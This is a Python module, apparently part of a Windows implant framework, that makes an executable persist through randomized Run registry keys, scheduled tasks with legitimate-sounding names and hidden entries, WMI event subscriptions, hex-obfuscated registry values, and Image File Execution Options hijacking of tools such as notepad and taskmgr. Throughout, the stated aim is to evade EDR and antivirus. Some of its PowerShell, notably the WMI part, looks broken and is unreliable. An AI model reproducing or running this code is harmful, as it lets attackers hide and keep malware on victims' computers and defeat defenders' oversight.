"""
Persistence Hardening Module - Registry Randomization & Advanced Persistence
Implements randomized registry paths, polymorphic scheduled tasks, and WMI event subscriptions
"""

import os
import sys
import json
import secrets
import logging
import struct
import ctypes
from typing import Optional, List, Dict, Any
import hashlib
import subprocess
import base64

logger = logging.getLogger('PersistenceHardening')

class RegistryRandomizer:
    """
    Randomizes registry persistence paths to avoid detection by EDR/antivirus.
    
    Strategy:
    1. Instead of HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (obvious)
    2. Use random software vendor paths: HKCU\\Software\\[RandomVendor]\\[RandomKey]
    3. Randomize Run, RunOnce, RunServices keys
    4. Use multiple registry hives (HKCU, HKLM if admin)
    """
    
    # Known registry locations for persistence (but we'll randomize)
    REGISTRY_PERSISTENCE_KEYS = [
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKCU\Software\Microsoft\Office\Word\Addins",
        r"HKCU\Software\Microsoft\Office\Excel\Addins",
        r"HKCU\Software\Microsoft\Internet Explorer\Extensions",
    ]
    
    # Legitimate-looking software vendor names for obfuscation
    RANDOM_VENDORS = [
        "Adobe", "Nvidia", "Intel", "Dell", "HP", "Lenovo", 
        "Oracle", "Java", "Apple", "Mozilla", "Google",
        "Microsoft", "Avast", "AVG", "Kaspersky", "Trend Micro"
    ]
    
    # Common Run key names
    RUN_KEY_NAMES = [
        "Run", "RunOnce", "RunServices", "RunServicesOnce",
        "Windows\\Run", "Windows\\RunOnce"
    ]
    
    @staticmethod
    def generate_random_vendor_path(seed: Optional[str] = None) -> str:
        """
        Generate random but plausible registry vendor path.
        
        Args:
            seed: Optional seed for reproducible randomization
        
        Returns:
            Registry path like: HKCU\\Software\\[VendorName]\\[RandomKey]
        """
        if seed:
            # Deterministic based on seed
            random_state = hashlib.sha256(seed.encode()).digest()
            vendor_idx = int.from_bytes(random_state[0:1], 'big') % len(RegistryRandomizer.RANDOM_VENDORS)
            vendor = RegistryRandomizer.RANDOM_VENDORS[vendor_idx]
        else:
            # Truly random
            vendor = secrets.choice(RegistryRandomizer.RANDOM_VENDORS)
        
        # Generate random key name
        random_key = ''.join(secrets.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') 
                             for _ in range(8))
        
        return f"HKCU\\Software\\{vendor}\\{random_key}"
    
    @staticmethod
    def generate_random_run_key_name(seed: Optional[str] = None) -> str:
        """
        Generate random Run key registry entry (not the path, but the value name).
        
        Args:
            seed: Optional seed for reproducibility
        
        Returns:
            Random value name like: Run, WindowsUpdate, SystemCheck, etc.
        """
        # Generate obfuscated but plausible value names
        prefixes = ["System", "Windows", "App", "Service", "Update", "Monitor"]
        suffixes = ["Check", "Service", "Update", "Manager", "Helper", "Controller"]
        
        if seed:
            random_state = hashlib.sha256(seed.encode()).digest()
            prefix_idx = int.from_bytes(random_state[0:1], 'big') % len(prefixes)
            suffix_idx = int.from_bytes(random_state[1:2], 'big') % len(suffixes)
            return f"{prefixes[prefix_idx]}{suffixes[suffix_idx]}"
        else:
            return f"{secrets.choice(prefixes)}{secrets.choice(suffixes)}"
    
    @staticmethod
    def create_randomized_registry_entry(target_path: str, value_name: Optional[str] = None, 
                                         seed: Optional[str] = None) -> Dict[str, str]:
        """
        Create registry entry with randomized path and value name.
        
        Args:
            target_path: Executable path to run
            value_name: Optional specific value name (auto-generated if None)
            seed: Optional seed for reproducibility
        
        Returns:
            Dictionary with registry path, value_name, and command
        """
        reg_path = RegistryRandomizer.generate_random_vendor_path(seed)
        val_name = value_name or RegistryRandomizer.generate_random_run_key_name(seed)
        
        # If it already has a Run/RunOnce component, append to it
        if "Run" not in reg_path:
            reg_path = f"{reg_path}\\Run"
        
        return {
            "registry_path": reg_path,
            "value_name": val_name,
            "value_data": target_path,
            "command": f'reg add "{reg_path}" /v {val_name} /t REG_SZ /d "{target_path}" /f'
        }
    
    @staticmethod
    def register_in_randomized_location(executable: str, seed: Optional[str] = None) -> bool:
        """
        Register executable in randomized registry location.
        Works on Windows only. Requires appropriate permissions.
        
        Args:
            executable: Full path to executable
            seed: Optional seed for reproducible randomization
        
        Returns:
            True if successful, False otherwise
        """
        if sys.platform != "win32":
            logger.warning("Registry persistence only works on Windows")
            return False
        
        try:
            import subprocess
            import winreg
            
            reg_entry = RegistryRandomizer.create_randomized_registry_entry(executable, seed=seed)
            
            # Execute registry command
            result = subprocess.run(
                reg_entry["command"],
                shell=True,
                capture_output=True,
                timeout=10
            )
            
            if result.returncode == 0:
                logger.info(f"Registered persistence at: {reg_entry['registry_path']}\\{reg_entry['value_name']}")
                return True
            else:
                logger.error(f"Failed to register persistence: {result.stderr.decode()}")
                return False
                
        except Exception as e:
            logger.error(f"Error registering persistence: {e}")
            return False


class PolymorphicTaskScheduler:
    """
    Creates scheduled tasks with polymorphic characteristics.
    
    Strategy:
    1. Randomize binary names and paths
    2. Use different trigger types (AtLogon, AtStartup, OnEventTrigger)
    3. Hide task creation (shadow copies, different task folders)
    4. Use legitimate-looking task names
    """
    
    # Legitimate-sounding task names
    TASK_NAMES = [
        "WindowsDefender",
        "SystemMaintenance",
        "DriversUpdate",
        "SoftwareUpdate",
        "NetworkDiagnostics",
        "SystemOptimization",
        "BackgroundTasksManager",
        "CloudSync",
        "OneDriveSync",
        "AppUpdate"
    ]
    
    # Different trigger types for polymorphism
    TRIGGER_TYPES = [
        "AtLogon",           # At user logon
        "AtStartup",         # At system startup (requires admin)
        "OnEventTrigger",    # On specific event
        "AtScheduledTime",   # At specific time daily
    ]
    
    @staticmethod
    def generate_polymorphic_binary_path() -> str:
        """
        Generate random but plausible binary path.
        Examples: %APPDATA%\\[RandomVendor]\\[App].exe
        """
        vendors = ["Microsoft", "Adobe", "Oracle", "Intel", "Nvidia"]
        vendor = secrets.choice(vendors)
        
        # Random subdirectory
        subdir = ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(8))
        
        # Random executable name
        exec_name = ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(10))
        
        return f"%APPDATA%\\{vendor}\\{subdir}\\{exec_name}.exe"
    
    @staticmethod
    def create_polymorphic_task(executable: str, task_name: Optional[str] = None,
                               trigger_type: str = "AtLogon", 
                               hidden: bool = True) -> Dict[str, str | bool]:
        """
        Create scheduled task with polymorphic characteristics.
        
        Args:
            executable: Path to executable
            task_name: Optional task name (auto-generated if None)
            trigger_type: Trigger type (AtLogon, AtStartup, OnEventTrigger, AtScheduledTime)
            hidden: If True, hide task from Task Scheduler UI
        
        Returns:
            Dictionary with task creation parameters
        """
        task_name = task_name or secrets.choice(PolymorphicTaskScheduler.TASK_NAMES)
        
        # Generate trigger based on type
        trigger_definition = ""
        if trigger_type == "AtLogon":
            trigger_definition = '-Trigger (New-ScheduledTaskTrigger -AtLogon)'
        elif trigger_type == "AtStartup":
            trigger_definition = '-Trigger (New-ScheduledTaskTrigger -AtStartup)'
        elif trigger_type == "OnEventTrigger":
            # Trigger on specific event (e.g., System startup event)
            trigger_definition = '-Trigger (New-ScheduledTaskTrigger -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 23))'
        elif trigger_type == "AtScheduledTime":
            # Daily at 8 AM
            trigger_definition = '-Trigger (New-ScheduledTaskTrigger -At 08:00 -Daily)'
        
        # Build PowerShell command
        ps_command = f"""
$action = New-ScheduledTaskAction -Execute '{executable}'
$trigger = {trigger_definition}
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Description "System maintenance task"
Register-ScheduledTask -TaskName '{task_name}' -InputObject $task -Force
"""
        
        if hidden:
            # Hide from Task Scheduler UI (requires registry modification)
            ps_command += f"""
$path = 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\{task_name}'
if (Test-Path $path) {{
    Set-ItemProperty -Path $path -Name 'SD' -Value ([byte[]]@(1,0,4,128,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,0,0,0,0))
}}
"""
        
        return {
            "task_name": task_name,
            "executable": executable,
            "trigger_type": trigger_type,
            "hidden": hidden,
            "powershell_command": ps_command
        }
    
    @staticmethod
    def register_polymorphic_task(executable: str, trigger_type: str = "AtLogon") -> bool:
        """
        Register a polymorphic scheduled task.
        Requires admin privileges on Windows.
        
        Args:
            executable: Path to executable
            trigger_type: Trigger type
        
        Returns:
            True if successful, False otherwise
        """
        if sys.platform != "win32":
            logger.warning("Task scheduling only works on Windows")
            return False
        
        try:
            import subprocess
            
            task_config = PolymorphicTaskScheduler.create_polymorphic_task(
                executable, 
                trigger_type=trigger_type,
                hidden=True
            )
            
            # Extract PowerShell command and execute
            ps_command: str = task_config["powershell_command"]  # type: ignore
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", ps_command],
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0:
                logger.info(f"Created polymorphic task: {task_config['task_name']}")
                return True
            else:
                logger.error(f"Failed to create task: {result.stderr.decode()}")
                return False
                
        except Exception as e:
            logger.error(f"Error creating polymorphic task: {e}")
            return False


class WMIEventSubscription:
    """
    Creates WMI event subscriptions for persistent code execution.
    
    Strategy:
    1. Create WMI event consumer (executable or script)
    2. Create WMI event filter (triggers on system events)
    3. Bind filter to consumer (no visible UI, registry-only)
    4. Triggers on: system startup, user logon, specific time, specific event IDs
    """
    
    @staticmethod
    def create_wmi_event_subscription(executable: str, event_filter: str = "startup") -> Dict[str, str | Any]:
        """
        Create WMI event subscription configuration.
        
        Args:
            executable: Path to executable
            event_filter: Type of trigger event (startup, logon, time-interval, etc.)
        
        Returns:
            Dictionary with WMI subscription details
        """
        
        # Generate random consumer/filter names to avoid detection
        consumer_name = f"Consumer_{secrets.token_hex(8)}"
        filter_name = f"Filter_{secrets.token_hex(8)}"
        
        # Define event query based on filter type
        event_query = ""
        if event_filter == "startup":
            # Trigger on system startup (Win32_ProcessStartTrace for svchost.exe)
            event_query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=\"C:\\\\Windows\\\\System32\\\\svchost.exe\""
        elif event_filter == "logon":
            # Trigger on user logon event
            event_query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName LIKE \"%winlogon%\""
        elif event_filter == "time-interval":
            # Trigger every 5 minutes
            event_query = "SELECT * FROM Win32_LocalTime WHERE Hour=0 AND Minute%5=0"
        elif event_filter == "network":
            # Trigger when network becomes available
            event_query = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=True"
        else:
            event_query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=\"C:\\\\Windows\\\\System32\\\\svchost.exe\""
        
        # PowerShell script to create WMI subscriptions (using proper escaping)
        ps_script = f"""
$consumer = New-Object System.Management.Instrumentation.ManagementEventWatcher.CommandLineEventConsumer
$consumer.Name = '{consumer_name}'
$consumer.ExecutablePath = '{executable}'
$consumer.CommandLineTemplate = '%executable%'

$filter = New-Object System.Management.Instrumentation.ManagementEventWatcher.WmiEventFilter
$filter.Name = '{filter_name}'
$filter.EventQuery = '{{event_query}}'
$filter.QueryLanguage = 'WQL'
$filter.Scope = New-Object System.Management.ManagementScope('\\\\\\\\.\\\root\\cimv2')

$binding = New-Object System.Management.Instrumentation.ManagementEventWatcher.WmiEventConsumerToFilter
$binding.Consumer = $consumer
$binding.Filter = $filter

# Store in WMI
$scope = New-Object System.Management.ManagementScope('\\\\\\\\.\\\root\\subscription')
$scope.Connect()

$consumer.Put($scope)
$filter.Put($scope)
$binding.Put($scope)
"""
        
        return {
            "consumer_name": consumer_name,
            "filter_name": filter_name,
            "executable": executable,
            "event_filter": event_filter,
            "event_query": event_query,
            "powershell_script": ps_script
        }
    
    @staticmethod
    def register_wmi_subscription(executable: str, event_filter: str = "startup") -> bool:
        """
        Register WMI event subscription.
        Requires admin privileges on Windows.
        
        Args:
            executable: Path to executable
            event_filter: Trigger event type
        
        Returns:
            True if successful, False otherwise
        """
        if sys.platform != "win32":
            logger.warning("WMI persistence only works on Windows")
            return False
        
        try:
            subscription = WMIEventSubscription.create_wmi_event_subscription(executable, event_filter)
            
            # Execute PowerShell
            result = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", subscription["powershell_script"]],
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0:
                logger.info(f"Created WMI subscription: {subscription['consumer_name']} → {subscription['filter_name']}")
                return True
            else:
                logger.error(f"Failed to create WMI subscription: {result.stderr.decode()}")
                return False
                
        except Exception as e:
            logger.error(f"Error creating WMI subscription: {e}")
            return False


class RegistryValueObfuscation:
    """
    Obfuscates registry values by hex-encoding binary paths and decoding at runtime.
    
    Strategy:
    1. Encode executable path as hexadecimal in registry
    2. Store alongside decoder stub
    3. At execution time, decode the path and execute
    4. Makes visual inspection of registry values difficult
    """
    
    @staticmethod
    def encode_path_to_hex(path: str) -> str:
        """
        Encode file path to hexadecimal string.
        
        Args:
            path: File path to encode
        
        Returns:
            Hex-encoded path
        """
        return path.encode('utf-8').hex()
    
    @staticmethod
    def decode_path_from_hex(hex_str: str) -> str:
        """
        Decode file path from hexadecimal string.
        
        Args:
            hex_str: Hex-encoded path
        
        Returns:
            Decoded file path
        """
        try:
            return bytes.fromhex(hex_str).decode('utf-8')
        except Exception as e:
            logger.error(f"Failed to decode hex path: {e}")
            return ""
    
    @staticmethod
    def create_obfuscated_registry_entry(executable: str, registry_path: str, 
                                        value_name: str) -> Dict[str, str]:
        """
        Create registry entry with hex-obfuscated executable path.
        
        Args:
            executable: Path to executable
            registry_path: Registry path where value will be stored
            value_name: Value name in registry
        
        Returns:
            Dictionary with obfuscation details
        """
        hex_path = RegistryValueObfuscation.encode_path_to_hex(executable)
        
        # Create decoding stub in batch/PowerShell
        batch_decoder = f"""
@echo off
setlocal enabledelayedexpansion
set "HEX_PATH={hex_path}"
for /f "tokens=1,2 delims=," %%%%A in ('powershell -NoProfile -Command "Write-Host ([System.Convert]::ToString(0x{hex_path}, 16) -replace '([0-9A-F]{{2}})',',[0-9A-F]0x$1')"') do (
    set "decoded=%%%%A"
)
!decoded!
"""
        
        # PowerShell variant (simpler)
        ps_decoder = f"""
$hex = '{hex_path}'
$bytes = @()
for ($i = 0; $i -lt $hex.Length; $i += 2) {{
    $bytes += [System.Convert]::ToByte($hex.Substring($i, 2), 16)
}}
$path = [System.Text.Encoding]::UTF8.GetString($bytes)
& $path
"""
        
        # Registry command to set hex value
        reg_command = f'reg add "{registry_path}" /v {value_name} /t REG_SZ /d "{hex_path}" /f'
        
        return {
            "executable": executable,
            "hex_encoded": hex_path,
            "registry_path": registry_path,
            "value_name": value_name,
            "batch_decoder": batch_decoder,
            "powershell_decoder": ps_decoder,
            "registry_command": reg_command
        }
    
    @staticmethod
    def register_obfuscated_value(executable: str, registry_path: str, 
                                 value_name: str) -> bool:
        """
        Register executable with hex-obfuscated path in registry.
        
        Args:
            executable: Path to executable
            registry_path: Registry path
            value_name: Value name
        
        Returns:
            True if successful, False otherwise
        """
        if sys.platform != "win32":
            logger.warning("Registry obfuscation only works on Windows")
            return False
        
        try:
            obfuscation = RegistryValueObfuscation.create_obfuscated_registry_entry(
                executable, registry_path, value_name
            )
            
            # Set the hex-encoded value in registry
            result = subprocess.run(
                obfuscation["registry_command"],
                shell=True,
                capture_output=True,
                timeout=10
            )
            
            if result.returncode == 0:
                logger.info(f"Registered obfuscated value: {registry_path}\\{value_name} = {obfuscation['hex_encoded'][:32]}...")
                return True
            else:
                logger.error(f"Failed to register obfuscated value: {result.stderr.decode()}")
                return False
                
        except Exception as e:
            logger.error(f"Error registering obfuscated value: {e}")
            return False


class ImageHijacking:
    """
    Implements image hijacking via registry to launch agent before legitimate tools.
    
    Strategy:
    1. Modify HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options
    2. Set Debugger key to point to our agent
    3. When legitimate tool (e.g., notepad.exe) is launched, our agent runs instead/first
    4. Agent can then launch the legitimate tool
    5. Completely invisible to user
    """
    
    # Common system tools to hijack (high execution probability)
    HIJACKABLE_TARGETS = [
        ("notepad.exe", "C:\\Windows\\System32\\notepad.exe"),
        ("calc.exe", "C:\\Windows\\System32\\calc.exe"),
        ("regedit.exe", "C:\\Windows\\System32\\regedit.exe"),
        ("taskmgr.exe", "C:\\Windows\\System32\\taskmgr.exe"),
        ("devmgmt.msc", "C:\\Windows\\System32\\devmgmt.msc"),
        ("services.msc", "C:\\Windows\\System32\\services.msc"),
        ("eventvwr.msc", "C:\\Windows\\System32\\eventvwr.msc"),
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
        ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe"),
        ("explorer.exe", "C:\\Windows\\explorer.exe"),
    ]
    
    @staticmethod
    def create_image_hijack(target_executable: str, agent_path: str) -> Dict[str, str]:
        """
        Create image hijacking registry configuration.
        
        Args:
            target_executable: Name of executable to hijack (e.g., "notepad.exe")
            agent_path: Path to agent executable to launch instead
        
        Returns:
            Dictionary with hijacking configuration
        """
        # Image File Execution Options registry path
        ifeo_path = f"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target_executable}"
        
        # Create registry command to set Debugger (runs our agent)
        registry_command = f'reg add "{ifeo_path}" /v Debugger /t REG_SZ /d "{agent_path}" /f'
        
        # Optional: Also set UseFilter to True to allow parallel execution
        registry_command_filter = f'reg add "{ifeo_path}" /v UseFilter /t REG_DWORD /d 1 /f'
        
        # PowerShell alternative
        ps_command = f"""
$path = '{ifeo_path}'
if (-not (Test-Path "Registry::$path")) {{
    New-Item -Path "Registry::$path" -Force | Out-Null
}}
Set-ItemProperty -Path "Registry::$path" -Name "Debugger" -Value "{agent_path}" -Force
Set-ItemProperty -Path "Registry::$path" -Name "UseFilter" -Value 1 -Force
"""
        
        return {
            "target_executable": target_executable,
            "agent_path": agent_path,
            "ifeo_registry_path": ifeo_path,
            "registry_command": registry_command,
            "registry_command_filter": registry_command_filter,
            "powershell_command": ps_command,
            "hijack_type": "IFEO_Debugger"
        }
    
    @staticmethod
    def register_image_hijack(target_executable: str, agent_path: str) -> bool:
        """
        Register image hijacking for specified executable.
        Requires admin privileges on Windows.
        
        Args:
            target_executable: Name of executable to hijack
            agent_path: Path to agent
        
        Returns:
            True if successful, False otherwise
        """
        if sys.platform != "win32":
            logger.warning("Image hijacking only works on Windows")
            return False
        
        try:
            hijack_config = ImageHijacking.create_image_hijack(target_executable, agent_path)
            
            # Execute registry commands
            result1 = subprocess.run(
                hijack_config["registry_command"],
                shell=True,
                capture_output=True,
                timeout=10
            )
            
            result2 = subprocess.run(
                hijack_config["registry_command_filter"],
                shell=True,
                capture_output=True,
                timeout=10
            )
            
            if result1.returncode == 0 and result2.returncode == 0:
                logger.info(f"Image hijacked: {target_executable} → {agent_path}")
                return True
            else:
                logger.error(f"Failed to register image hijack: {result1.stderr.decode() or result2.stderr.decode()}")
                return False
                
        except Exception as e:
            logger.error(f"Error registering image hijack: {e}")
            return False
    
    @staticmethod
    def hijack_multiple_targets(agent_path: str, targets: Optional[List[str]] = None) -> Dict[str, bool]:
        """
        Hijack multiple system executables.
        
        Args:
            agent_path: Path to agent
            targets: Optional list of executables to hijack (uses defaults if None)
        
        Returns:
            Dictionary with success status for each target
        """
        if targets is None:
            targets = [t[0] for t in ImageHijacking.HIJACKABLE_TARGETS]
        
        results = {}
        for target in targets:
            try:
                results[target] = ImageHijacking.register_image_hijack(target, agent_path)
            except Exception as e:
                logger.error(f"Failed to hijack {target}: {e}")
                results[target] = False
        
        logger.info(f"Image hijacking results: {results}")
        return results


class PersistenceManager:
    """
    Unified persistence management across multiple mechanisms.
    """
    
    @staticmethod
    def deploy_all_persistence_methods(executable: str, seed: Optional[str] = None) -> Dict[str, bool]:
        """
        Deploy all available persistence methods.
        
        Args:
            executable: Path to executable
            seed: Optional seed for reproducible randomization
        
        Returns:
            Dictionary with success/failure for each method
        """
        results = {
            "registry_randomized": False,
            "registry_obfuscated": False,
            "polymorphic_task": False,
            "wmi_subscription": False,
            "image_hijacking": False
        }
        
        # Deploy registry randomization
        try:
            results["registry_randomized"] = RegistryRandomizer.register_in_randomized_location(executable, seed)
        except Exception as e:
            logger.error(f"Registry persistence failed: {e}")
        
        # Deploy registry value obfuscation
        try:
            randomized_path = RegistryRandomizer.generate_random_vendor_path(seed)
            value_name = RegistryRandomizer.generate_random_run_key_name(seed)
            results["registry_obfuscated"] = RegistryValueObfuscation.register_obfuscated_value(
                executable, randomized_path, value_name
            )
        except Exception as e:
            logger.error(f"Registry obfuscation persistence failed: {e}")
        
        # Deploy polymorphic scheduled task
        try:
            results["polymorphic_task"] = PolymorphicTaskScheduler.register_polymorphic_task(executable)
        except Exception as e:
            logger.error(f"Polymorphic task failed: {e}")
        
        # Deploy WMI event subscription
        try:
            results["wmi_subscription"] = WMIEventSubscription.register_wmi_subscription(executable)
        except Exception as e:
            logger.error(f"WMI persistence failed: {e}")
        
        # Deploy image hijacking on high-probability targets
        try:
            hijack_targets = ["notepad.exe", "calc.exe", "taskmgr.exe"]
            hijack_results = ImageHijacking.hijack_multiple_targets(executable, hijack_targets)
            results["image_hijacking"] = all(hijack_results.values())
        except Exception as e:
            logger.error(f"Image hijacking failed: {e}")
        
        logger.info(f"Persistence deployment results: {results}")
        return results
